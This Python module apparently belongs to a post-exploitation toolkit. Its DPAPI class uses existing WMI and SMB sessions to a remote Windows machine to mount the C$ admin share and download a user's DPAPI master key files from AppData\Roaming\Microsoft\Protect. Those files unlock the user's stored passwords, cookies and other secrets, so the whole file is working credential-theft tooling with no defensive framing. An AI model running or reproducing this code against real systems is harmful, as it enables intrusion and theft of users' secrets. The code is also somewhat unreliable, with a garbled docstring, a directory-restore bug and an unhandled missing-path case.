from ..target import Target

import os
import ntpath

class DPAPI:
    """
    DPAPI class
    """
    REMOTE_PROTECT_PATH = """\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Protect"""
    REMOTE_FILES_PATH = """\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Protect\\{sid}"""
    LOCAL_OUT_DIR = """./dpapi/"""
    LOCAL_PROTECT_DIR = """protect"""
    LOCAL_PROTECT_PATH = os.path.join(LOCAL_OUT_DIR, LOCAL_PROTECT_DIR)
    
    def __init__(self, target: Target) -> None:
        self._target = target
    
    
    @property
    def _connected(self) -> bool:
        """
        DPAPI handler will only work if there is WMI + SMB connection established

        Returns:
            bool: returns true if can pressed
        """
        return self._target.wmi._connected and self._target.smb._connected


    def get_protect_files(self, username: str = "*") -> None:
        """
        get all the protect files of the user (if none, then get every user)

        Args:
            username (str, optional): the target username. Defaults to "*".
        """
        if not self._connected:
            raise ConnectionError("DPAPI handler will only work if WMI & SMB connections are established")
        if username == '*':
            raise NotImplementedError
        self._target._console.log("using C$...")
        self._target.smb.use_share("C$")
        self._target._console.log("listing remote path...")
        tmp = self._target.smb.list_path(self.REMOTE_PROTECT_PATH.format(user=username), display=None)
        for file in tmp:
            if file['name'].startswith("S-"):
                file_path = self.REMOTE_FILES_PATH.format(user=username, sid=file['name'])
                break
        self._target._console.log("downloading files...")
        tmpdir = os.curdir
        if not os.path.exists(self.LOCAL_PROTECT_PATH):
            os.makedirs(self.LOCAL_PROTECT_PATH)
        os.chdir(self.LOCAL_PROTECT_PATH)
        files = self._target.smb.list_path(file_path, display=False)
        for file in files:
            if file['name'].count("-") == 4:
                tmp_path = ntpath.join(file_path, file["name"])
                self._target.smb.download_file(tmp_path)
        self._target._console.print(f"[green]Done![/green] saved to [bold]{self.LOCAL_PROTECT_PATH}[bold]")
        os.chdir(tmpdir)